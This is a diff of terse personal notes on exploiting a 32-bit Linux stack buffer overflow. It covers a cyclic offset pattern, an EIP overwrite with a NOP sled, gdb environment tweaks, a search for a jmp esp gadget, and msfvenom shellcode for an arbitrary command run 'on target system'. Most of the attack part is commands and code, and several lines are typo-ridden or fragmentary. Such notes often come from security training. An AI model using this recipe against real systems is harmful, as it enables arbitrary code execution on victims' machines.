@@ -180,15 +180,14 @@ File > Export
     offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
     print (offset)
 or
-    
-  show
+    find registry numer at EIP, input it on wiremask.eu
     
     run <<<$(python scwipt.py)
 
     show env
     unset env LINES
     unset enc COLUMNS
-
+show env - gdb ./func > show en
 or
     
     offset = "A" * 62
@@ -196,7 +195,7 @@ or
     nop = "\x90" * 15
     
     print(offset+eip)
-## run <<< $(python scriptname.py)
+## ON target System run <<< $(python scriptname.py)
 find registry numer at EIP, input it on wiremask.eu
     info proc map
    run on target system: find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 
@@ -206,7 +205,7 @@ find registry numer at EIP, input it on wiremask.eu
     0xf7f645fb
     0xf7f6460f
 
-msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+RUN FROM OPSTATION msfvenom -p linux/x86/exec CMD=<Command you want to run> -b '\x00' -f python
 get output add to svupr
 
     ./func <<<$(python scwipt.py)
